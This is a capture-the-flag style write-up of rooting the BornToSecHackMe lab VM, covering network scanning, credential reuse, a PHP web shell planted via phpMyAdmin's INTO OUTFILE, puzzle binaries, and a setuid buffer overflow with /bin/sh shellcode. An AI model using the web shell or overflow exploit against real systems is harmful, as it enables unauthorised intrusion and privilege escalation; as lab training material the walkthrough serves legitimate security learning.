# First Writeup

First, we have a virtual machine with a weak Linux OS, containing a lot of vulnerabilities and, we have to find how we can be a root user by exploiting some of them.

## Recon phase

First when we run OS, we have are in reconnaisance phase, we have to find entrypoint of machine. To do so, we can run nmap on it. As our machine is on a virtualbox preset network. Address range we select is 192.168.56.0/24. We can run nmap on this range to potentially find our target.

This command will perform a ICMP Echo Ping in the specified range `192.168.56.1 -> 192.168.56.254`.

To use nmap on 42 school computer we have to perform the scan inside a container, the command will be:

```bash
# If nmap is installed on your host - https://nmap.org/download
nmap -sn -n -PE 192.168.56.0/24

# Command to run nmap inside container
docker run --rm -it instrumentisto/nmap -sn -n -PE 192.168.56.0/24
```

```bash
$ docker run --rm -it instrumentisto/nmap -sn -n -PE 192.168.56.0/24
```

<details>
<summary>Nmap Logs</summary>

```bash
Unable to find image 'instrumentisto/nmap:latest' locally
latest: Pulling from instrumentisto/nmap
213ec9aee27d: Pull complete
f30b2c90d95c: Pull complete
7eeec3a557a1: Pull complete
Digest: sha256:eee3f7c3df06ec65d134d979ca658f9d4920dc6d3acc9d29b5c42fdaa4d56176
Status: Downloaded newer image for instrumentisto/nmap:latest
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-19 21:12 UTC
Nmap scan report for 192.168.56.1
Host is up (0.00021s latency).
Nmap scan report for 192.168.56.100
Host is up (0.00056s latency).
Nmap scan report for 192.168.56.103
Host is up (0.00051s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.70 seconds
```

</details>

We found our target on ip 192.168.56.103.

## Port scan

We can now perform a complete scan of our target, to do so the following nmap command will do a Full TCP port scan with service version detection and with default NSE scripts.

```bash
# If nmap is installed on your host - https://nmap.org/download
nmap -T4 -sC -sV -p 1-65535 -sS 192.168.56.103

# Command to run nmap inside container
docker run --rm -it instrumentisto/nmap -T4 -sC -sV -p 1-65535 -sS 192.168.56.103
```

<details>
  <summary>Nmap logs</summary>

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 11:32 UTC
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.11% done; ETC: 11:32 (0:00:01 remaining)
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 11:33 (0:00:02 remaining)
Nmap scan report for 192.168.56.103
Host is up (0.0017s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07bf0220f08ac8481efc41aea446fa25 (DSA)
|   2048 26dd80a3dfc44b531e534246ef6e30b2 (RSA)
|_  256 cfc38c31d7477c84e2d21631b28e63a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap     Dovecot imapd
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_ssl-date: 2022-11-13T11:33:03+00:00; -3s from scanner time.
|_imap-capabilities: IDLE listed LITERAL+ Pre-login more have LOGINDISABLEDA0001 STARTTLS SASL-IR post-login capabilities ENABLE OK LOGIN-REFERRALS IMAP4rev1 ID
443/tcp open  ssl/http Apache httpd 2.2.22
|_ssl-date: 2022-11-13T11:33:03+00:00; -3s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-title: 404 Not Found
993/tcp open  ssl/imap Dovecot imapd
|_ssl-date: 2022-11-13T11:33:03+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: IDLE listed LITERAL+ Pre-login AUTH=PLAINA0001 have more SASL-IR post-login capabilities IMAP4rev1 OK LOGIN-REFERRALS ENABLE ID
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|\_clock-skew: mean: -3s, deviation: 0s, median: -3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.98 seconds

```

</details>

The finded services are

-   ftp
-   ssh
-   http
-   imap
-   ssl/http
-   ssl/imap.

## Exploit web services

Attack surface are pretty wide. The first service we can look are web server with title "Hack me if you can" hosted on port 80.
At first overview, we found nothing, only a website with a landing page, we can start using ffuf to scan public path in the URL.

The wordlist used come from dirbuster https://github.com/Twibow/Pentest-WordLists/blob/master/directory_wordlist.txt

```bash
ffuf http://192.168.56.103/FUZZ -w wordlist.txt
```

We don't find any interessting path, so we will perform scan on ssl/http service.

```bash
ffuf https://192.168.56.103/FUZZ -w wordlist.txt
```

In the ffuf report, we can see three different interessting service:

-   Phpmyadmin service, we can potentially used to perform some SQL query if we found the password. https://192.168.56.103/phpmyadmin/
-   Forum on https://192.168.56.103/forum
-   SquirrelMail service https://192.168.56.103/webmail/src/login.php

## Checking the forum

In the page https://192.168.56.103/forum/index.php?id=6, we can see a log file pasted as thread.

After some investigation we can see log containing a password :

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

> We can suppose lmezard user mix up login with his password.
> And we are right because if we try to login into the forum with these credential, we have an access granted.

On the setting page of lmezard we have a potentially interessting email: laurie@borntosec.net

## Checking the email

If we try to login into squirrel mail with the same credential, it work!
https://192.168.56.103/webmail/src/login.php

```bash
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

## Checking the phpmyadmin

So, as we found a phpmyadmin service, we will try to use these credential to access database. It also work.

Now, as we are granted in phpmyadmin page, we can potentially obtain webserver user access into our target.

This tutorial show how to obtain webshell using sql command https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/

Using the following SQL query return an error:

```sql
SELECT "<form method='get' action='shell.php'><input type='text' name='cmd'/ autofocus><button type='submit'>submit</button></form><?php $output='';exec($_GET['cmd'], $output);echo(implode('<br>', $output)); ?>"
INTO OUTFILE "/var/www/forum/cmd.php"
```

> Error is:
>
> ```
> Can't create/write to file '/var/www/forum/cmd.php' (Errcode: 13)
> ```

#### Finding a writable directory

##### By fuzzing

We have to find a directory where write access will be granted.

If we return a second ffuf in the /forum directory we found some other dir where we can potentially write in it:

```bash
ffuf https://192.168.31.103/forum/FUZZ -w wordlist.txt
```

We find templates_c folder, so if we try to write in it, it work.

##### By checking source code

MyLittleForum is an open-source project, we can easily find the sources on the Internet: [On Github](https://github.com/ilosuna/mylittleforum).

<ins>In the README:</ins>

> Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.

If a misconfiguration is made, we can use `templates_c`

#### Retry with the writable directory

```sql
SELECT "<form method='get' action='shell.php'><input type='text' name='cmd'/ autofocus><button type='submit'>submit</button></form><?php $output='';exec($_GET['cmd'], $output);echo(implode('<br>', $output)); ?>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

## Use the web-shell

After injecting our webshell, we can get to https://192.168.56.103/forum/templates_c/cmd.php

To check if the shell is right:

```bash
$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

By looking in home folder, we can see a LOOKATME folder in /home directory.

```bash
$ ls -l /home
total 0
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
```

```bash
$ cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

## Exploiting the FTP

We gave a password file containing the potential session credential for lmezard user. When we try to login to the lmezard session it doesn't work but as we previously see we have a FTP service running in the target machine.
We can try these credential to check if the session works.

```bash
➜  ~ ftp
ftp> open
(to) 192.168.56.103
Connected to 192.168.56.103.
220 Welcome on this server
Name (192.168.56.103:nabentay): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```

Yes, the credential works to log into the ftp server.
After logging in, we can see two file:

1. A README
1. A `fun` file

we will use get to download them locally

```bash
ftp> get README
local: README remote: README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0.00 secs (179.5977 kB/s)
ftp> get fun
local: fun remote: fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.02 secs (44.0571 MB/s)
```

The README file say that the result is laurie password and the fun file contain some interessting information:

```bash
➜  ~ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
➜  ~ file fun
fun: POSIX tar archive (GNU)
➜  ~ cat fun
ft_fun/0000750000175000001440000000000012575653666011066 5ustar  nnmusersft_fun/C4D03.pcap0000640000175000001440000000003412563172202012421 0ustar  nnmusers}void useless() {

//file259ft_fun/GKGEP.pcap0000640000175000001440000000003412563172202012541 0ustar  nnmusers}void useless() {

//file711ft_fun/A5GPY.pcap0000640000175000001440000000005312563172202012532 0ustar  nnmusers	printf("Hahahaha Got you!!!\n");

//file31ft_fun/K8SEB.pcap0000640000175000001440000000005412563172202012522 0ustar  nnmusers
[...]
```

## Understanding the fun file

We can see file pattern in each file with number, we have to reorganise file to sort them in right order. This pretty straightforward script rename file with packet order number

```bash
#!/bin/sh
for f in *.pcap; do
    d="./$(head +1 "$f" | grep 'file' | grep -Eo '[0-9]{1,4}').txt"
    if [ ! -f "$d" ]; then
        mv "$f" "$d"
    else
        echo "File '$d' already exists! Skiped '$f'"
    fi
done

mv .txt file750.txt
```

In the 750 file, we can see a C function

```c
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```

We can get all getme function to get the password.

```bash
➜  cat {0..750}.txt > mybigfile.txt
➜  cat mybigfile.txt | grep -A 2 getme
char getme1 () { return 'I'; }
char getme2 () { return 'h'; }
char getme3 () { return 'e'; }
char getme4 () { return 'a'; }
char getme5 () { return 'r'; }
char getme6 () { return 't'; }
char getme7 () { return 'p'; }
char getme8 () { return 'w'; }
char getme9 () { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
---
printf("%c",getme1());
printf("%c",getme2());
printf("%c",getme3());
printf("%c",getme4());
printf("%c",getme5());
printf("%c",getme6());
printf("%c",getme7());
printf("%c",getme8());
printf("%c",getme9());
printf("%c",getme10());
printf("%c",getme11());
printf("%c",getme12());
printf("\n");
printf("Now SHA-256 it and submit");
```

As we can see the message is **`Iheartpwnage`**, so to finish this challenge we have to hash the password in SHA256 to connect to laurie session.

https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)&input=SWhlYXJ0cHduYWdl

The SHA256 password is

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

## Exploit the SSH

In the laurie session, we can find two file in the home directory:

```bash
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

In the README file we can see that we need to resolve the bomb challenge to get password for thor session

We will get this file locally to use ghidra to perform file analysis

```bash
scp laurie@192.168.56.103:~/bomb /tmp/
```

## Exploit the bomb

---

### Step 1

| Exercice                          | Resolution Script |
| --------------------------------- | ----------------- |
| [step1.c](./scripts/bomb/step1.c) | ❌                |

So we can deduce for phase one we only have to provide string:

> `Public speaking is very easy.`

```bash
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
```

### Step 2

| Exercice                          | Resolution Script |
| --------------------------------- | ----------------- |
| [step2.c](./scripts/bomb/step2.c) | ❌                |

As we see it's a recursive function. It's a factorial serie. As we need to only provide 6 arguments, this serie is pretty straigtforward to resolve:

The terms are easy to guess. Each number is some multiple of preceding number. Starting from first, multiply it by 2 and get the second number.

Multiply the second by 3 and get the third number.

Multiply the third by 4 and get the fourth number.

Multiply the fourth by 5 and get the fifth number.

Multiply the fifth by 6 and get the sixth number.

> The answer is:
>
> ```
> 1 2 6 24 120 720
> ```

### Step 3

| Exercice                          | Resolution Script |
| --------------------------------- | ----------------- |
| [step3.c](./scripts/bomb/step3.c) | ❌                |

We can see that we need to provide three argument:

1. the first one will be the switch case choose
1. the second is letter that will be compared at the end
1. the last one will be the number that will skip bomb explosion

So we have 8 combinaison working, here is the seven possible combinaison:

> 0 q 777
> 1 b 214
> 2 b 755
> 3 k 251
> 4 o 160
> 5 t 458
> 6 v 780
> 7 b 524

### Step 4

| Exercice                          | Resolution Script                   |
| --------------------------------- | ----------------------------------- |
| [step4.c](./scripts/bomb/step4.c) | [step4.py](./scripts/bomb/step4.py) |

The func4 seem to be a fibonnaci function.

We can deduce we need to provide only one number corresponding to the number of iteration needed to obtain 55:

> **9 iteration** is needed to obtain 55.

### Step 5

| Exercice                          | Resolution Script                   |
| --------------------------------- | ----------------------------------- |
| [step5.c](./scripts/bomb/step5.c) | [step5.py](./scripts/bomb/step5.py) |

The function wait a 6 length string and will compare it to "giants". We can see that the string is encrypted with a simple xor with 0xf. So we can decrypt it with the following python script:

```bash
$ python3 ./scripts/bomb/step5.py
```

> The output will be "**opukmq**" and we can provide it to the bomb to access the to the last phase.

### Step 6

For the step 6, we have multiple constraints:

1. 6 digits separated by a space `%d %d %d %d %d %d`
1. Between 1 and 6, and unique
1. The hint of the README tells: 4 (it must begin by the 4): `4 %d %d %d %d %d`

So basically, we can just brut-force the standard input to try any combinasion [step6.py](./scripts/bomb/step6.py)

This Python script is creating all cases for this stage (_called `test_setX.txt`_)

To use it:

```bash
$ python3 ./scripts/bomb/step6.py
$ for f in ./*.txt; do echo $f; ./bomb $f | tail -1 | grep -v blown; done
```

> That gives us:
> `4 2 6 1 3 5`

### Get along with all answers

The README says:

> HINT:
> P
> &nbsp;&nbsp;2
> &nbsp;&nbsp;b
>
> o
> 4
>
> NO SPACE IN THE PASSWORD (password is case sensitive).

If we fill this up:

> **P**ublic speaking is very easy.
> 1 **2** 6 24 120 720
> 1 **b** 214
> 9
> **o**pekmq
> **4** 2 6 3 1 5

We remove the spaces and newlines:

> **Publicspeakingisveryeasy.126241207201b2149opekmq426135**

### Troubleshooting

## The Turtle

Now, we have an access to the thor home, we will check what is present on it:

```bash
thor@BornToSecHackMe:~$ ls
README  turtle
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
thor@BornToSecHackMe:~$ cat turtle
Tourne gauche de 90 degrees
Avance de 50
[...]
Can you digest the message? :)
```

After some research, we can find that turtle is a lib to draw with python
We will now write a script that will reproduce the instructions given in the turtle file:

```python
  import turtle
  t = turtle.Turtle()

  [...]
  t.right(90)
  t.forward(100)
  t.backward(200)
```

The turtle is drawing the word SLASH, we will convert it to md5 and we will have the password for the zaz user.

```bash
ssh zaz@192.168.56.101
password: 646da671ca01bb5d84dbb5fb2238dc8e
zaz@BornToSecHackMe:~$ ls
exploit_me  mail
```

We're now connected as zaz!

## Exploit me

```bash
zaz@BornToSecHackMe:~$ ls -l exploit_me
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
```

We can see that the binary is setuid, so we can execute it as root. We can also see that the binary is owned by zaz, so we can try to exploit it.

We will do a buffer overflow to overwrite the return address and redirect it to the shellcode. We made a little script to do it:

```python

import struct

# We fill the buffer of the first argument (140 char)
pad = "\x41" * 140

# We set the adress of the extended instruction pointer to the end of the allowed space of the previous buffer
EIP = struct.pack("I", 0xbffff6A0)

# We set 100 "No Operator" to avoid any diruption of the program
NOP = "\x90" * 100

# Inject the shell code to run /bin/sh
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# We display it to run it on the console
print(pad + EIP + NOP + shellcode)
```

./exploit_me $(python exploit.py)

```bash
zaz@BornToSecHackMe:~$ whoami
root
```

We are now root!

